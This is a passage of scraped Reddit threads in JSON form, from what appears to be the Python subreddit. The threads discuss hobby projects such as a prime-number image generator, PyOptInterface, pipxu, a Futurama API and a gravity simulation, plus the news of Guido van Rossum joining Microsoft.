    "post_content": "",
    "comments": [
        {
            "author": "Gedanke",
            "score": "271",
            "content": "How it's done: We proceed in 5 steps: We resize the image to contain at most a certain amount of pixels. Run various image processing steps like edge enhancement and smoothing before converting the image into grey-scale (using Pillow) We then quantise the image into just having 5 to 10 greyness levels. Now we map each greyness level to a digit, et voila, we have embedded the picture into a number. It now remains to tweak some of the digits until we find a prime number that still looks like the image. Note: According to the prime number theorem, the density of prime numbers is asymptotically of order 1/log(n). Hence, if we have a number with m digits, the number of primality tests that we expect to do until we hit a prime number is roughly proportional to m. Since we use the Baillie–PSW primality test, the overall expected computational complexity of our prime searching procedure is O(nlog(n)³). You can find the code @ Github and experiment yourself.",
            "replies": [
                {
                    "author": "-_-STRANGER-_-",
                    "score": "78",
                    "content": "Awesome idea first of all, and then awesome implementation."
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "It's the mathematical \"we\" :) I worked on this project on my own",
                    "replies": [
                        {
                            "author": "Gedanke",
                            "score": "150",
                            "content": "It's the mathematical \"we\" :) I worked on this project on my own"
                        }
                    ]
                },
                {
                    "author": "Beheska",
                    "score": "30",
                    "content": "viola voila* \"Voila\" is French for \"there it is\". \"Viola\" is French for \"raped\".",
                    "replies": [
                        {
                            "author": "Gedanke",
                            "score": "18",
                            "content": "Oh my! Thank you very much for pointing this out!"
                        },
                        {
                            "author": "mprenditore",
                            "score": "4",
                            "content": "\"Viola\" is also \"violet\" (color and also the flower) in italian"
                        },
                        {
                            "author": "[deleted]",
                            "score": "4",
                            "content": "\"Viola\" is French for \"raped\". Someone's gotta let r/lingling40hrs know. They'd have a field day."
                        },
                        {
                            "author": "chmod--777",
                            "score": "3",
                            "content": "So if I shove a French person into the back of my van I can say \"Voilà, viola\"?"
                        }
                    ]
                },
                {
                    "author": "zaqal",
                    "score": "2",
                    "content": "Absolutely amazing. Great work."
                }
            ]
        },
        {
            "author": "erogone775",
            "score": "67",
            "content": "Never have I seen something so useless and so cool at the same time. Great job!"
        },
        {
            "author": "supercoupon",
            "score": "25",
            "content": "719"
        },
        {
            "author": "blerp_2305",
            "score": "10",
            "content": "How long does it take to render and what sort of primality test do you do?"
        },
        {
            "author": "minepopper",
            "score": "5",
            "content": "719 is part of the picture too ;P"
        },
        {
            "author": "aequatio",
            "score": "3",
            "content": "Nerdy. Like it."
        }
    ]
},
{
    "post_author": "RRTheGuy",
    "post_id": "1bweu9x",
    "post_score": "2",
    "post_time": "Friday, April 5, 2024 at 1:39:50 PM GMT+3",
    "flair_text": "News",
    "post_title": "A solver of Le Compte Est Bon and Le Mot Le Plus Long",
    "media": [
        "https://github.com/RadoTheProgrammer/dcdljeu"
    ],
    "post_content": "Hi, I made a new project called dcdljeu (written in French), a solver for the games Le Compte Est Bon and Le Mot Le Plus Long from the TV Show Des Chiffres Et Des Lettres.",
    "comments": [
        {
            "author": "jimtk",
            "score": "3",
            "content": "C'est pas chic comme code. Aucun commentaire, aucun espace entre les fonctions. Les functions internes a d'autres functions sont-elles vraiment nécessaires? Il y a aussi une bonne quantité de code commenté \"off\". L'idée du projet est vraiment bonne cependant. (Ca doit faire 25 ans que j'ai regardé cette émission!).",
            "replies": [
                {
                    "author": "RRTheGuy",
                    "score": "1",
                    "content": "Merci pour le feedback. Sinon le code il marche ?",
                    "replies": [
                        {
                            "author": "jimtk",
                            "score": "2",
                            "content": "Je l'ai juste lu et pas executé. Ca prend une analyse plus détaillée avant que je roule du code inconnu sur mon PC.",
                            "replies": [
                                {
                                    "author": "RRTheGuy",
                                    "score": "1",
                                    "content": "Ok, je te conseille d’utiliser un debugger pour executer le code étape par étape et voir les valeurs des variables."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "RRTheGuy",
                    "score": "1",
                    "content": "Je viens de nettoyer un minimum le code de dcdljeu, est-ce mieux"
                }
            ]
        },
        {
            "author": "123_alex",
            "score": "3",
            "content": "I see you hate whitespace. Highly recommend using it.",
            "replies": [
                {
                    "author": "RRTheGuy",
                    "score": "1",
                    "content": "What do you mean?"
                },
                {
                    "author": "ekbravo",
                    "score": "1",
                    "content": "Agree, this code flow will be cursed by my IDE until I come to my senses and add blank lines between functions and comments."
                },
                {
                    "author": "RRTheGuy",
                    "score": "1",
                    "content": "I cleaned the code, is it better?"
                }
            ]
        }
    ]
},
{
    "post_author": "c0decs",
    "post_id": "1bwky6l",
    "post_score": "31",
    "post_time": "Friday, April 5, 2024 at 6:30:41 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "An efficient modeling interface for mathematical optimization: PyOptInterface",
    "media": [
        "https://github.com/metab0t/PyOptInterface",
        "https://metab0t.github.io/PyOptInterface/",
        "https://metab0t.github.io/PyOptInterface/benchmark.html",
        "https://metab0t.github.io/PyOptInterface/numpy.html"
    ],
    "post_content": "I recently develop an efficient modeling interface for optimization problems in Python called PyOptInterface.\nSource code is at https://github.com/metab0t/PyOptInterface\nDocumentation is at https://metab0t.github.io/PyOptInterface/\nWhat My Project Does\nIt is designed as a very thin wrapper of native C API of optimizers and attempts to provide common abstractions of an algebraic modelling environment including model, variable, constraint and expression with the least overhead of performance.\nTarget Audience\nPython users that want to build and solve an optimization model\nComparison\nThe benchmark comparing PyOptInterface with some other modeling interfaces can be found here.\nExample\nThis link shows an introductory example to use PyOptInterface and HiGHS to solve N-queens problem.\nFeedbacks and stars are welcome.",
    "comments": [
        {
            "author": "marsupiq",
            "score": "2",
            "content": "Looks cool! I am not an optimization expert, I just recently had some contact with Pyomo through a friend and got interested in the theory as well (my degree is in mathematical physics, which really didn’t involve optimization at all). One thing that irritated me was how poorly designed Pyomo’s API is (typing is a nightmare and e.g. to get an instance of an AbstractModel you have to define values of indexed parameters as dictionaries…). So your project looks really cool! But I think it would be really cool if you get a more expressive API, e.g. if one could define inequality constraints using <=, >= operators. Not really sure how that could be implemented, but there must be a way, since polars also has a way to use numpy for pl.Expr objects.",
            "replies": [
                {
                    "author": "BeverlyGodoy",
                    "score": "2",
                    "content": "You can look into pygmo. It also supports traditional opt routines. API is quite clean and easy to pick up.",
                    "replies": [
                        {
                            "author": "marsupiq",
                            "score": "1",
                            "content": "Looks cool, but that looks more like an optimization library that implements algorithms itself (rather than an interface to solvers), am I right? Is that really performant, compared to solvers like HiGHS or Gurobi?",
                            "replies": [
                                {
                                    "author": "BeverlyGodoy",
                                    "score": "1",
                                    "content": "Right, They have several algorithms that you can use right away here. As for the performance part, in several scenarios meta-heuristics can provide better solutions especially if you have a large number of parameters. But at the end of the day it's about the problem you are solving. My point was that pygmo provides a cleaner interface for defining problems as class. That you can wrap into the pygmo solvers. Also you can add a custom interface to other solvers if you want like this."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "redditusername58",
                    "score": "1",
                    "content": "That could be done with the rich comparison methods"
                }
            ]
        },
        {
            "author": "redditusername58",
            "score": "1",
            "content": "I really like Nocedal and Wright's book on optimization. If you're familiar with that, do you have any recommendations for more recent books on nonlinear programming? Or books on MILP, MIQP, QCQP, MIQCQP, SCOP, and MISOCP?",
            "replies": [
                {
                    "author": "c0decs",
                    "score": "2",
                    "content": "I am not familiar with NLP so no recommendations. For integer programming, you can look at this book."
                }
            ]
        },
        {
            "author": "Ropropzz",
            "score": "1",
            "content": "Long time user of (commercial) Gurobi(py) here. I'm definitely intrigued, although a bit unsure about a few things. Perhaps you can enlighten me? We are using the compute server rather than a local library. Does it support this? Where would it be faster than Gurobipy exactly? Does it include building the model? (in other words, Running model.update) or is it just the steps prior to this?",
            "replies": [
                {
                    "author": "c0decs",
                    "score": "1",
                    "content": "Thanks for your attention! I have no experience for compute server, but I assume that it works out of the box by setting correct parameters as mentioned in our docs on Gurobi. from pyoptinterface import gurobi env = gurobi.Env(empty=True) env.set_raw_parameter(\"ComputeServer\", \"myserver1:32123\") env.set_raw_parameter(\"ServerPassword\", \"pass\") env.start() model = gurobi.Model(env) Because gurobipy is closed source, it is hard to comment why they are slower. As shown in benchmarks, PyOptInterface and JuMP.jl are all significantly faster than gurobipy and have similar architecture. We measure the time including construction of model and submitting the model to optimizer, although we set the time limit as 0.0 seconds to rule out the influence of solution process. I guess the difference of performance comes from the design of abstraction. All performance-critical parts of PyOptInterface are implemented in C++. Anyway, you can try it on a moderate model and compare the performance with gurobipy. It aims to provide full-featured interface to Gurobi and other optimizers as well. Except for callbacks and nonlinear constraints, PyOptInterface can replace gurobipy in most use cases. It can Add and delete variables Add and delete linear/quadratic/SOS constraints Set linear/quadratic objectives Set and get parameters Solve the model Obtain the solution and query more attributes of variables and constraints In this example, you can just replace from pyoptinterface import highs with from pyoptinterface import gurobi and solve the N queens problem. You can also interact with Gurobi-specific parameters and attributes via the solver-specific API. I hope the explanation may help you. If you have some issues or questions in usage, welcome to open an issue or discussion thread in the repo."
                }
            ]
        },
        {
            "author": "heeroyuy93",
            "score": "1",
            "content": "This is great. It has the potential to be a game changer, breaking the two language paradigm that JuMP has created: I use Julia for my optimization work, and Python for everything else. I find it ironic at the least that the language that should fill the gap between production and deployment has created a gap of itself, mainly because JuMP is a great project living in the middle of a myriad of poorly documented packages. Two questions, directly related to my applications (NLPs). How difficult would it be to write a wrapper around Ipopt and Knitro? Do you have such in your pipeline?"
        }
    ]
},
{
    "post_author": "azhenley",
    "post_id": "jsyf3c",
    "post_score": "1788",
    "post_time": "Thursday, November 12, 2020 at 8:06:10 PM GMT+3",
    "flair_text": "News",
    "post_title": "Guido van Rossum joins Microsoft",
    "media": [
        "https://twitter.com/gvanrossum/status/1326932991566700549?s=21"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "8fingerlouie",
            "score": "700",
            "content": "So many negative comments. Why is it that people can’t see the positive sides of this ? Guido stepped down as BDFL when he retired. He has about as much say in python development as any of us (maybe a bit more), and if he can make Python easier to use on Windows, how on earth will that harm anyone ? VS Code already has pretty great python support, and MS recently released a new “more better” python language server for it. MS also has the money to fund some serious developer hours into the pain points of Python, you know the boring stuff nobody gets around to doing in their spare time.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "404",
                    "content": "The dream is that python becomes as easily integrable into excel as VBA",
                    "replies": [
                        {
                            "author": "Sandor64",
                            "score": "81",
                            "content": "As they say, all data is finally passed away into an excel sheet!"
                        },
                        {
                            "author": "uncanneyvalley",
                            "score": "25",
                            "content": "I read somewhere that Excel's internals are a nightmare. Its a brilliant piece of software, but it has decades of technical debt accumulated. It still uses DDE and OLEDB! It all used to be written in P-Code, but surely there's some .net in there anymore. MS declared VBA dead at the end of the '00s. Imagine Excel, but as a framework over Pandas, with native Python (maybe TypeScript too?) done Jupiter Notebook style. Built-in version control. A modern data visualization package that had hooks for integrating customizations or even other packages entirely. Ability to click and push reports to a cloud platform. The ability to use worksheets like NoSQL for rapid prototyping, then convert them to a real tables easily. Bonus points for a conversion tool for formulas and VBA, even if only partial conversions. Think if VSCode, Excel, and Python had a beautiful clever love child. I don't know how making a 3-way love child works in software, but that's the code's business and not mine lol. IDK. I'd use the ever-living hell out of something like that."
                        },
                        {
                            "author": "ohaiya",
                            "score": "6",
                            "content": "Just a guess, but since he's joined the developer division, the focus will be on cloud and tooling in Azure to make using and deploying Python apps into the cloud. Windows will come along with that, and since VBA is no longer going to receive any new features, there'll need to be a replacement, but I'd bet C# for that more than Python. But overall, I think this will lead to making Python in the cloud easier since cloud seems to be the main focus of Microsoft currently."
                        }
                    ]
                },
                {
                    "author": "Yoghurt42",
                    "score": "20",
                    "content": "MS recently released a new “more better” python language server for it. Which is unfortunately closed source."
                },
                {
                    "author": "ManvilleJ",
                    "score": "35",
                    "content": "This can only be good for all of us. The creator of python, a major supporter of open source, joining microsoft. Microsoft, who has been actively working to support the development community. He will be in a position to influence one of the most powerful companies in the world. What a great next step for the former BDFL Of course, we all need to be vocal in making sure Microsoft and all other tech companies have a positive impact on the tech community. But naysayers are just holding a grudge against Microsoft from the 90s without considering the massive work they have done for open source and the development community in the last 10 years.",
                    "replies": [
                        {
                            "author": "jrootabega",
                            "score": "17",
                            "content": "I disagree that it can ONLY be good. It might be. But it could also be used to make people have fond feelings for Microsoft (a corporation driven by maximizing investor profit) like they might have for Guido. That makes it easier to slip from your \"embrace and extend\" phase to your \"extinguish\" phase, or as may be more appropriate today, \"dominate.\" He is serving, in some part, as a mascot."
                        }
                    ]
                },
                {
                    "author": "el_padlina",
                    "score": "16",
                    "content": "Because historically being suspicious of any Microsoft action was smarter than trusting them. Embrace, extend, extinguish and all that shit."
                },
                {
                    "author": "Not-the-best-name",
                    "score": "10",
                    "content": "Iam super excited. I always end up opening damn excel for some or other reason. Imagine it has a Python console! Imagine all the jobs I could secure if shit hits the fan. And the also, Pylance and Python on VSCode is freaking amazing. Honestly feel like VSCode is doing Python a huge favour right now for extremely easy setup and Pylance is so good it is legit hard to make dumb coding mistakes since the editor literally solves all off that. Along with Python type checking we are getting somewhere boys."
                }
            ]
        },
        {
            "author": "Slampamper",
            "score": "35",
            "content": "If only this could mean Microsoft is looking to chuck out that stupid DAX language of them"
        },
        {
            "author": "Jade_camel109",
            "score": "122",
            "content": "I wonder if they made him invert a binary tree"
        },
        {
            "author": "GrbavaCigla",
            "score": "81",
            "content": "Plot twist: Microsoft didn't update to python 3"
        },
        {
            "author": "8roll",
            "score": "69",
            "content": "I trust this guy. Let's see what more he achieves :)"
        },
        {
            "author": "pumpyboi",
            "score": "217",
            "content": "What are all these doomsday comments? Microsoft is very big in open source contributions. Typescript is an amazing language. I'm sure it'll all be fine. Python is bigger than Guido anyway."
        },
        {
            "author": "0rsinium",
            "score": "21",
            "content": "I'm wondering what relation will be between mypy (developed by Guido) and pyright (developed by Microsoft)."
        },
        {
            "author": "LightShadow",
            "score": "69",
            "content": "Let's get Python .NET Core a reality!"
        },
        {
            "author": "DanManPanther",
            "score": "59",
            "content": "This is really exciting. I wonder what he'll be doing at Microsoft. A statically typed Python with sum types and pattern matching (yay 3.10) would pretty much be my dream language. Throw that on .NET with access to the ecosystem and you've got a hearty stew going. Also - good for him!"
        },
        {
            "author": "neopanz",
            "score": "20",
            "content": "The man deserves some compensation for the all the wealth creation he has enabled through Python."
        }
    ]
},
{
    "post_author": "koldakov",
    "post_id": "1bsiht7",
    "post_score": "11",
    "post_time": "Sunday, March 31, 2024 at 10:24:22 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Futurama API written in async Python",
    "media": [
        "https://github.com/koldakov/futuramaapi/blob/main/app/middlewares/secure.py",
        "https://github.com/koldakov/futuramaapi",
        "https://feedback.render.com/features/p/connection-between-render-proxy-and-user-service-supports-http2",
        "https://futuramaapi.com/"
    ],
    "post_content": "I've created a simple API service https://github.com/koldakov/futuramaapi to access Futurama units with async Python + FastAPI + SQLAlchemy (PostgreSQL).\nI've chosen Hypercorn for a web server to achieve HTTP/2 support - considering I didn't find yet cheap hosting that supports HTTP/2. Heroku doesn't support, render doesn't support.\nAlso it has some code related to GraphQL (I used strawberry).\n+ I didn't find a lot of discussions about Heroku + FastAPI - the problem will be with redirect to https. As default fastapi (starlette) middleware doesn't work with proxies there will be an infinite loop if you try to use fastapi.middleware.httpsredirect.HTTPSRedirectMiddleware. Chain will be: Client https-> Proxy(Hypercorn, for example) http-> fastapi, in that case as you can see the request is secure, but fastapi (starlette) won't understand this and will redirect to https. Here is a simple workaround to support https under proxy: https://github.com/koldakov/futuramaapi/blob/main/app/middlewares/secure.py\nConstructive feedback is greatly appreciated.\nSource code: https://github.com/koldakov/futuramaapi\nWorking example: https://futuramaapi.com",
    "comments": [
        {
            "author": "DuckDatum",
            "score": "15",
            "content": "lunchroom theory reply follow angle sparkle intelligent mysterious ad hoc weather This post was mass deleted and anonymized with Redact",
            "replies": [
                {
                    "author": "koldakov",
                    "score": "2",
                    "content": "Give me a reason why and I can add anything required =)",
                    "replies": [
                        {
                            "author": "DuckDatum",
                            "score": "4",
                            "content": "gaze paltry placid wakeful vegetable angle somber ruthless narrow far-flung This post was mass deleted and anonymized with Redact",
                            "replies": [
                                {
                                    "author": "koldakov",
                                    "score": "0",
                                    "content": "The website exactly about the cartoon Futurama. If you check the website Fry is on a first place and he has id == 1 =)"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "6omph9",
            "score": "1",
            "content": "Pretty cool actually, nice work",
            "replies": [
                {
                    "author": "koldakov",
                    "score": "1",
                    "content": "Thank you kindly!"
                }
            ]
        },
        {
            "author": "jdehesa",
            "score": "1",
            "content": "Good news, everyone!",
            "replies": [
                {
                    "author": "koldakov",
                    "score": "2",
                    "content": "Actually that’s a good idea to add quotes to each character"
                }
            ]
        }
    ]
},
{
    "post_author": "HP7933",
    "post_id": "1bwpgkz",
    "post_score": "14",
    "post_time": "Friday, April 5, 2024 at 9:34:58 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "The Python on Microcontrollers (and Raspberry Pi) Newsletter. Weekly news, subscribe for free",
    "media": [
        "https://www.adafruitdaily.com/"
    ],
    "post_content": "With the Python on Microcontrollers newsletter, you get all the latest information on Python running on hardware in one place! MicroPython, CircuitPython and Python on single Board Computers like Raspberry Pi & many more.\nThe Python on Microcontrollers newsletter is the place for the latest news. It arrives Monday morning with all the week’s happenings. No advertising, no spam, easy to unsubscribe.\n10,921 subscribers - the largest Python on hardware newsletter out there.\nCatch all the weekly news on Python for Microcontrollers with adafruitdaily.com.\nThis ad-free, spam-free weekly email is filled with CircuitPython, MicroPython, and Python information that you may have missed, all in one place!\nEnsure you catch the weekly Python on Hardware roundup– you can cancel anytime – try our spam-free newsletter today!\nhttps://www.adafruitdaily.com/",
    "comments": [
        {
            "author": "mikechinea",
            "score": "4",
            "content": "I swore off getting anymore newsletters but I signed up for this one anyway, may the spam bots be gentle on me",
            "replies": [
                {
                    "author": "HP7933",
                    "score": "2",
                    "content": "No spam will ever be sent, leaving is easy. All part of Adafruit.com's policies. No advertising either (though the newsletter leans a bit Adafruit as they are doing a lot in this space."
                }
            ]
        },
        {
            "author": "wdnleg_513",
            "score": "1",
            "content": "I don’t"
        },
        {
            "author": "NeighborhoodOk92",
            "score": "1",
            "content": "Great!"
        }
    ]
},
{
    "post_author": "bulletmark",
    "post_id": "1bw4ctq",
    "post_score": "11",
    "post_time": "Friday, April 5, 2024 at 3:44:33 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "pipxu - a faster alternative to pipx",
    "media": [
        "https://github.com/astral-sh/uv",
        "https://docs.python.org/3/library/venv.html",
        "https://github.com/pypa/pipx",
        "https://github.com/bulletmark/pipxu",
        "https://pip.pypa.io/en/stable/",
        "https://www.baeldung.com/linux/path-variable",
        "https://pypi.org/"
    ],
    "post_content": "What my project does\npipxu installs Python applications, i.e. Python packages which have one or more executable programs, into independent isolated virtual environments on your system. Each package and it's dependencies are thus insulated from all other applications, and from the system Python. pipxu creates links to application executables in a common directory, which you have in your PATH. Packages are typically sourced from PyPI, the Python Package Index.\nTarget Audience\nPython users and developers.\nComparison\npipxu is a re-implementation of most of the functionality of the popular pipx tool but is much faster because it uses uv to create and install application virtual environments instead of venv and pip as used by pipx.\nRead more at https://github.com/bulletmark/pipxu",
    "comments": [
        {
            "author": "riksi",
            "score": "5",
            "content": "IIRC it is in uv roadmap to provide this functionality."
        },
        {
            "author": "AndydeCleyre",
            "score": "2",
            "content": "Cool! BTW I continue to use and recommend your edir project. FWIW my Zsh project zpy provides a pipx clone, pipz, which also uses uv as the backend if it's installed (which you can use pipz to do). Otherwise it uses pip+pip-tools.",
            "replies": [
                {
                    "author": "bulletmark",
                    "score": "1",
                    "content": "Thanks. Ultimately I create these tools for myself and use edir multiple times every day. But it is great if others find them useful also! Note you may want to have a look at my cdhist tool which I use hundreds of time per day (as cd -- and with fzf). I don't know how people survive without it, or at least something like it!"
                }
            ]
        },
        {
            "author": "monorepo",
            "score": "1",
            "content": "Hi u/bulletmark, can you repost in the structure described by automod? I'd like to have the community see this but can't approve it as is.",
            "replies": [
                {
                    "author": "bulletmark",
                    "score": "1",
                    "content": "Doesn't it already say all that? First paragraph describes what it does. Second paragraph says it is replacement/alternative to pipx.",
                    "replies": [
                        {
                            "author": "monorepo",
                            "score": "1",
                            "content": "Yeah but the section headers are 'required' to help everyone see the high points that they are interested in",
                            "replies": [
                                {
                                    "author": "bulletmark",
                                    "score": "2",
                                    "content": "I have to have headers that literally say \"What My Project Does\", \"Target Audience\", etc?!"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "drbobb",
            "score": "1",
            "content": "Is it backwards compatible? Or would I need to reinstall all my pipx apps?",
            "replies": [
                {
                    "author": "bulletmark",
                    "score": "2",
                    "content": "No, it is completely independent of pipx (although it links the same executables in your ~/.local/bin if the same package is installed. Either pipx or pipxu can take control of those links easily if you reinstall a package). I could probably easily write an import command to do that. Will think about it."
                },
                {
                    "author": "bulletmark",
                    "score": "1",
                    "content": "After thinking about it there are many different options that pipx can install apps so it is difficult to migrate them automatically. Also, you can pipx list and I would guess it would only take < 1 min to mouse click + paste all your apps into a pipxu install command line so it is actually very easy and quick to do manually."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "Thank goodness. Python doesn’t have nearly enough package managers."
        }
    ]
},
{
    "post_author": "to_tgo",
    "post_id": "loxpv6",
    "post_score": "1706",
    "post_time": "Sunday, February 21, 2021 at 5:05:25 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "An Interactive Python Cheat Sheet That Brings The Answer To You",
    "media": [
        "https://speedsheet.io/s/python",
        "https://www.youtube.com/watch?v=66RumAF50_4"
    ],
    "post_content": "After realizing that I spent far too much time looking things up while coding, I decided to solve the problem and created this...\nThe Python SpeedSheet: https://speedsheet.io/s/python\nIt is an interactive cheat sheet that brings the answer to you. It is a really simple idea but it worked so well that it has become an indispensable tool for me any time I'm coding. Type in what you are looking for in the search bar and the speed sheet will display the answer.\nIt covers core Python only and I'm sure it is missing 'must have' items but I think it is still very useful.\nTo those of you viewing this on smaller screens, I apologize. I haven't had time to streamline the UI.\nHere is a video to show you how it works:\nhttps://www.youtube.com/watch?v=66RumAF50_4\nTry it out and let me know what you think.\nTLDR:\nThis is an interactive cheat sheet for core Python.",
    "comments": [
        {
            "author": "Shiv_ka_ansh_",
            "score": "62",
            "content": "Very useful. Great initiative👍"
        },
        {
            "author": "thesheff17",
            "score": "37",
            "content": "can you put the code on github? looks like a cool project. I could def see a copy to clipboard button by the code that you think you will copy/paste often. Would be cool to make a django or similar speedsheet if possible.",
            "replies": [
                {
                    "author": "to_tgo",
                    "score": "38",
                    "content": "I actually have an app version of this I use for my personal stuff and I think it is brilliant! I'm considering putting it out at some point. Django is definitely on the list and I'm looking for ideas for things people will find useful. Numpy is probably next.",
                    "replies": [
                        {
                            "author": "OperationOtherwise26",
                            "score": "8",
                            "content": "would you bi so kind to send me the app?? 0:00 0:00 0:01"
                        },
                        {
                            "author": "[deleted]",
                            "score": "2",
                            "content": "app please! great work!"
                        },
                        {
                            "author": "lordmoriartea",
                            "score": "3",
                            "content": "good stuff be sure to share the git of this. Can be used very creatively on many things."
                        },
                        {
                            "author": "ad1413",
                            "score": "1",
                            "content": "Oooo numpy please please"
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "30",
            "content": "Pushing this into a VS Code extension would be a great next step. Keep people out of their web browser and all the potential distractions"
        },
        {
            "author": "ciscocollab",
            "score": "18",
            "content": "Really well done. I think if this was on GitHub, it would let people add new Pull Requests with new code example and it could be a community driven project. But even if it’s not on GitHub, I will see myself using this a lot so thanks!"
        },
        {
            "author": "F-C0D3",
            "score": "10",
            "content": "Thank you! This helps a lot for beginners as myself."
        },
        {
            "author": "Jet61007",
            "score": "8",
            "content": "Amazing My undergrad days of Java (it was the future language for all! Haha) tests with notepad and only javadocs ...wish this type of search interpreter was around- rote memorization was the only way Would love to see this extend to charts, data analysis, and basics to things like numpy, pandas, and R"
        },
        {
            "author": "Working-Mind",
            "score": "6",
            "content": "Great job and thank you so much! Easy searching, syntax and EXAMPLES equals perfection!"
        },
        {
            "author": "Theonetheycallgreat",
            "score": "5",
            "content": "Where did you get all the guides?"
        },
        {
            "author": "jjjohhn",
            "score": "5",
            "content": "Thank you!"
        },
        {
            "author": "PrinCe_LoGic",
            "score": "5",
            "content": "So it's basically like man pages, but for Python? Very cool indeed!"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bsp3gu",
    "post_score": "0",
    "post_time": "Monday, April 1, 2024 at 3:00:13 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Glass_Dingo_3984",
            "score": "1",
            "content": "Nice idea good job"
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "eorvjg",
    "post_score": "1787",
    "post_time": "Wednesday, January 15, 2020 at 12:31:39 AM GMT+3",
    "flair_text": "",
    "post_title": "I made a gravity simulation https://github.com/phgilde/gravity_simulation",
    "media": [
        "https://external-preview.redd.it/d5rbPiPJ6EojCKoPVd37nNOYbeXeIaAnzVeMrUwNxJE.png?width=640&crop=smart&format=pjpg&auto=webp&s=75d26dbf71b46601a6656999fab320c8726e88f7"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "psharpep",
            "score": "260",
            "content": "Nice start here! I noticed you mentioned this sim took 3 hours to run - if you're interested in further improving this code, you can probably get 1000x faster performance on the same hardware. Consider looking into the following topics (you should be able to find more info on all of them with a Google search): Vectorization. A specific example is getting rid of your for loop in simulate.py line 66 - this can be easily done with NumPy vectorization instead, which will make this much faster. Alternatively, you can at the very least give this a Numba @jit decorator by adding just a single line of code, which will move this for loop down to low-level code. Better integration schemes. Your RK4 implementation is a great start! Adaptive RK4 schemes will be a lot faster, though, and symplectic schemes will be astronomically more accurate for an orbital dynamics simulation. Fast Multipole Method interactions - this one's absolutely HUGE. Right now, your function to calculate acceleration due to gravity, a(x), is of computational complexity O(n2 ) - the time it takes to run is proportional to the number of particles squared. The fast multipole method (\"FMM\", often referred to as one of the top 10 most important algorithms of the 20th century), gives you an arbitrarily-precise solution to this problem that has complexity O(n log(n) ). This will literally get you a thousand-fold faster calculation right here alone. Object-oriented methods. You have a ton of redundant calculations: for example, you recalculate the radius of each object at each timestep (simulate.py line 69), when you really only need to recalculate it after each collision - if there's no collision, the radius of the particle doesn't change. Source: grad student whose research involves a lot of scientific computing",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "42",
                    "content": "So I tried looking into fmm but didn't understand it really. Do you know some resources to get into it?",
                    "replies": [
                        {
                            "author": "memebecker",
                            "score": "8",
                            "content": "https://m.youtube.com/watch?v=qMLIyZi8Sz0 I found this guest lecture"
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "24",
                    "content": "Wow thanks I will look into these things, when posting here I was hoping for comments like this one. What do you mean by object oriented methods? Implementing every particle as an object? But then I couldn't use numpys fast matrix multiplications?",
                    "replies": [
                        {
                            "author": "lolfunctionspace",
                            "score": "16",
                            "content": "Very nice! I wrote something similar to your sim, albeit mine is interactive and you make swarms by clicking ( https://mjsprengel.github.io/gravity/ ) Source code is here: https://github.com/mjsprengel/gravity?files=1 I used the Euler-Cromer integration method. Also known as Semi-implicit euler method. Just thought I'd drop by and share similar work"
                        }
                    ]
                },
                {
                    "author": "timeforscience",
                    "score": "5",
                    "content": "This is awesome, I had no idea it was possible to exceed O(n2) for these calculations. Thanks for posting this."
                },
                {
                    "author": "Astrokiwi",
                    "score": "5",
                    "content": "For gravity n-body simulations, it's more common to use the Barnes-Hut algorithm - I haven't looked into FMM but it seems closely related. Here you clump distant particles together using an oct-tree or quad-tree, but gravity for the clumped cell is just calculated as a monopole. The other thing is a particle-particle particle-mesh method, where you bin masses onto a grid and do some Fourier transforms to work out the large-scale forces, and then add a small n2 sum to calculate short-range forces.",
                    "replies": [
                        {
                            "author": "chinpokomon",
                            "score": "1",
                            "content": "Is that FMM? I've been looking at doing a similar thing using quad-trees (2D and not 3D), for any region of space, the force vector between that and another region seems that it should only need to be calculated as a monopole. A quad-tree of the entire set could allow you find regions, but the tree wouldn't be built just to group masses, it would have a partitioning partly assisted by the distance away from a mass. Essentially each mass would have its own quad-tree representation of the space. I think that this would improve things, but I didn't take it further yet because I don't see a good way for the tree to self-balance and every tree would need to rebalance after collisions, so I think I'm back to high complexity and O(n2). I also considered just using a grid, so that I wouldn't have to do the rebalancing, but I've shifted gears and started looking at shaders now, thinking that I might be able to batch these calculations into something I can run on the GPU compute units in parallel."
                        },
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "Interesting method, I'll try to implement it, but how do you make sure to not include the particle you want to calculate the force for in the tree? Wouldn't I have to re-calculate the tree for every particle, making the runtime N2 log N? Do you choose theta so the particle can't be in an internal node and don't use the external node the particle is in"
                        },
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "One more question: why is it inaccurate to use the center of mass and sum of mass of a group of bodies to calculate the force, compared to calculating the sum of the forces of each individual body?"
                        }
                    ]
                },
                {
                    "author": "jack-of-some",
                    "score": "1",
                    "content": "Speaking of a 1000x increase in speed ... I'll just ... leave this learning resource here. https://www.youtube.com/watch?v=x58W9A2lnQc"
                }
            ]
        },
        {
            "author": "petdance",
            "score": "104",
            "content": "\"First the Earth cooled. And then the dinosaurs came, but they got too big and fat, so they all died and they turned into oil. And then the Arabs came and they bought Mercedes Benzes.\""
        },
        {
            "author": "[deleted]",
            "score": "33",
            "content": "GitHub: https://github.com/phgilde/gravity_simulation"
        },
        {
            "author": "BRENNEJM",
            "score": "41",
            "content": "r/gifsthatendtoosoon I really wanted to see if those last couple particles remained in orbit."
        },
        {
            "author": "quantumwoooo",
            "score": "10",
            "content": "That's so amazing It looks SO COOOOOLLLL Imagine this as a screensaver, or, wallpaper"
        },
        {
